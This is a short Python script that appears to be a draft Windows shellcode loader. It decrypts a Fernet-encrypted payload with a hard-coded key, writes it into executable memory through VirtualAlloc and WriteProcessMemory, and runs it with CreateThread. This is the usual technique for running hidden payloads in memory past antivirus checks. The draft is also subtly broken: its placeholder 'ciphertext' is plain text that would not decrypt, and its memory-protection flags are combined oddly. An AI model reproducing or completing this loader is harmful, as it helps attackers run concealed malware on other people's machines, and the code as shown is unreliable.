from cryptography.fernet import Fernet
import ctypes
from ctypes import *

key = b'Dp3fafvz-bfrS4v1kc7APsNlHMI14q_v8UVtZ6XIWko='
cipher = Fernet(key)

encrypted_data = b'this is a test'

# Decrypt the content
decrypted_data = cipher.decrypt(encrypted_data)

# Allocate memory for the decrypted content
size = len(decrypted_data)
# addr = windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40)
# addr = windll.kernel32.VirtualAlloc(None, size, 0x1000 | 0x2000 | 0x40, 0x40)
addr = windll.kernel32.VirtualAlloc(None, size, 0x3000, 0x40 | 0x80)
ctypes.windll.kernel32.WriteProcessMemory(None, addr, decrypted_data, size, None)

# # Create a function pointer to the memory address
# func_ptr = ctypes.CFUNCTYPE(ctypes.c_void_p)(addr)
# func_ptr = ctypes

# # Call the function pointer as a function
# result = func_ptr()

# Create a new thread to execute the decrypted software in memory
thread_id = ctypes.c_ulong(0)
ctypes.windll.kernel32.CreateThread(None, 0, addr, None, 0, ctypes.byref(thread_id))